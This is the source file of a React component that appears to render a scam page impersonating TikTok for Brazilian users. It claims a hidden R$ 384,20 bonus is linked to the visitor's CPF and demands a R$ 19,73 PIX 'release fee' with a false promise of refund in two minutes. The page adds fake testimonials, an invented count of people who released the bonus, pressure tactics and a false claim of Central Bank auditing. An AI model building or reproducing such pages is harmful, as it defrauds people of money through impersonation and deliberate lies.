import { useState } from "react";
import { Loader2, ChevronDown, ChevronUp } from "lucide-react";
import StickyCtaBar from "./StickyCtaBar";
import tiktokLogo from "@/assets/tiktok-logo.png";
import testimonial1 from "@/assets/testimonial-1.jpg";
import testimonial2 from "@/assets/testimonial-2.jpg";
import testimonial3 from "@/assets/testimonial-3.jpg";

interface FunnelUpsellBonusOcultoProps { balance: string; onGeneratePix: () => void; isGenerating: boolean; leadCpf?: string; leadName?: string; }

const FaqItem = ({ question, answer }: { question: string; answer: string }) => { const [open, setOpen] = useState(false); return (<div className="bg-white rounded-lg border border-gray-100 overflow-hidden"><button onClick={() => setOpen(!open)} className="w-full flex items-center justify-between p-3 text-left"><span className="text-gray-800 text-xs font-semibold pr-2">{question}</span>{open ? <ChevronUp className="w-4 h-4 text-gray-400 shrink-0" /> : <ChevronDown className="w-4 h-4 text-gray-400 shrink-0" />}</button>{open && <div className="px-3 pb-3 pt-0"><p className="text-gray-500 text-[11px] leading-relaxed">{answer}</p></div>}</div>); };
const TestimonialCard = ({ img, name, location, text, amount }: { img: string; name: string; location: string; text: string; amount: string }) => (<div className="bg-white rounded-lg p-3 border border-gray-100"><div className="flex items-center gap-2 mb-2"><img src={img} alt={name} loading="lazy" className="w-8 h-8 rounded-full object-cover" /><div><p className="text-gray-800 text-xs font-semibold">{name}</p><p className="text-gray-400 text-[10px]">{location}</p></div><span className="ml-auto text-green-600 text-[10px] font-bold">+{amount}</span></div><p className="text-gray-500 text-[11px] leading-relaxed">"{text}"</p></div>);

const FunnelUpsellBonusOculto = ({ balance, onGeneratePix, isGenerating, leadCpf, leadName }: FunnelUpsellBonusOcultoProps) => {
  return (
    <div className="fixed inset-0 z-[80] bg-[#F0F2F5] overflow-y-auto">
      <div className="bg-[#FE2C55] py-3 flex justify-center"><img src={tiktokLogo} alt="TikTok" className="h-5 w-auto brightness-0 invert" /></div>
      <main className="px-3 py-4 max-w-lg mx-auto pb-24">
        {leadCpf && (<div className="bg-white rounded-xl p-3 mb-3 shadow-sm flex items-center gap-3 border border-green-100"><div className="w-8 h-8 rounded-full bg-green-50 flex items-center justify-center shrink-0"><span className="text-sm">🪪</span></div><div className="flex-1"><p className="text-gray-800 text-xs font-semibold">{leadName || "Titular"}</p><p className="text-gray-400 text-[11px]">CPF: {leadCpf}</p></div><span className="text-green-600 text-[10px] font-bold">Verificado ✓</span></div>)}
        <div className="bg-[#FFF8E1] border border-[#FFD54F] rounded-xl p-4 mb-3"><div className="flex items-start gap-2"><span className="text-lg leading-none mt-0.5">🎁</span><div><p className="text-gray-900 text-sm font-bold mb-1">Saldo Oculto Detectado no Seu CPF</p><p className="text-gray-700 text-xs leading-relaxed">O sistema identificou um <span className="font-bold">crédito adicional não listado</span> na primeira verificação. Esse valor estava retido no módulo de conciliação e precisa ser liberado manualmente.</p></div></div></div>
        <div className="bg-white rounded-xl p-5 shadow-sm mb-3">
          <div className="flex justify-center mb-3"><span className="bg-amber-50 text-amber-700 text-[10px] font-bold px-3 py-1 rounded-full border border-amber-200 animate-pulse">⏳ LIBERAÇÃO PENDENTE</span></div>
          <div className="bg-gradient-to-r from-[#FFF8E1] to-[#FFF3E0] rounded-lg p-4 mb-4 border border-amber-100"><p className="text-gray-500 text-[10px] text-center mb-1">BÔNUS OCULTO ENCONTRADO</p><p className="text-2xl font-black text-center text-gray-900">R$ 384,20</p><p className="text-green-600 text-[10px] text-center font-semibold mt-1">Será somado ao seu saldo de {balance}</p></div>
          <div className="space-y-2 mb-4">{["Valor vinculado ao CPF " + (leadCpf || "do titular") + " no banco de dados", "Crédito proveniente de campanhas anteriores não resgatadas", "A taxa de liberação de R$ 19,73 é reembolsada em até 2 minutos"].map((t, i) => (<div key={i} className="flex items-start gap-2"><span className="text-green-500 text-sm mt-0.5">✓</span><p className="text-gray-700 text-xs leading-relaxed"><span className="font-bold">{t}</span></p></div>))}</div>
          <div className="bg-gray-50 rounded-lg p-3 mb-4 border border-gray-100"><div className="flex items-center justify-between mb-1"><span className="text-gray-500 text-[11px]">Taxa de liberação:</span><span className="text-gray-900 text-sm font-bold">R$ 19,73</span></div><div className="flex items-center justify-between"><span className="text-gray-500 text-[11px]">Reembolso automático:</span><span className="text-green-600 text-[11px] font-bold">✓ Em até 2 min</span></div></div>
          <button onClick={onGeneratePix} disabled={isGenerating} className="w-full py-3.5 rounded-xl bg-[#FE2C55] text-white font-bold text-sm tracking-wide hover:brightness-105 transition-all active:scale-[0.98] disabled:opacity-70 flex items-center justify-center gap-2 shadow-lg shadow-red-200" style={{ animation: isGenerating ? 'none' : 'ctaPulse 2s ease-in-out infinite' }}>{isGenerating ? (<><Loader2 className="w-4 h-4 animate-spin" />Gerando PIX...</>) : "Liberar Bônus de R$ 384,20 →"}</button>
          <p className="text-gray-400 text-[10px] text-center mt-2">🔒 Pagamento seguro via PIX • Reembolso garantido</p>
          <p className="text-gray-500 text-[11px] text-center leading-relaxed mt-3"><span className="font-bold text-gray-700">9.432 pessoas</span> já liberaram o bônus oculto nos últimos 7 dias.</p>
        </div>
        <div className="mb-3"><p className="text-gray-600 text-xs font-bold text-center mb-2">Perguntas frequentes</p><div className="space-y-2"><FaqItem question="O que é o bônus oculto?" answer="São créditos de campanhas anteriores do TikTok que ficaram retidos no módulo de conciliação." /><FaqItem question="Por que preciso pagar R$ 19,73?" answer="A taxa cobre o custo operacional da conciliação bancária. É 100% reembolsável em até 2 minutos." /><FaqItem question="Esse valor será somado ao meu saldo?" answer="Sim! Os R$ 384,20 serão adicionados diretamente ao seu saldo principal." /><FaqItem question="E se eu não liberar agora?" answer="O bônus oculto tem prazo de resgate limitado. Se não for liberado durante esta sessão, pode não estar disponível na próxima consulta." /></div></div>
        <div className="mb-3"><p className="text-gray-600 text-xs font-bold text-center mb-2">Quem liberou, recebeu</p><div className="space-y-2"><TestimonialCard img={testimonial1} name="Mariana S." location="Recife, PE" text="Nem sabia que tinha esse bônus! Paguei a taxa e em menos de 1 minuto caiu tudo junto no meu PIX." amount="R$ 384,20" /><TestimonialCard img={testimonial2} name="Carlos A." location="Belo Horizonte, MG" text="Fiquei desconfiado no começo, mas a taxa voltou rapidinho e o bônus caiu junto com o saldo." amount="R$ 384,20" /><TestimonialCard img={testimonial3} name="Juliana R." location="Curitiba, PR" text="Já tinha feito o saque e apareceu esse bônus extra. Liberei na hora e recebi tudo certinho." amount="R$ 384,20" /></div></div>
        <div className="text-center pb-6"><p className="text-gray-400 text-[10px]">Sistema de conciliação auditado pelo Banco Central</p></div>
      </main>
      <StickyCtaBar onClick={onGeneratePix} isGenerating={isGenerating} label="Liberar Bônus de R$ 384,20" bgColor="bg-[#FE2C55]" shadowColor="shadow-red-200" />
    </div>
  );
};

export default FunnelUpsellBonusOculto;
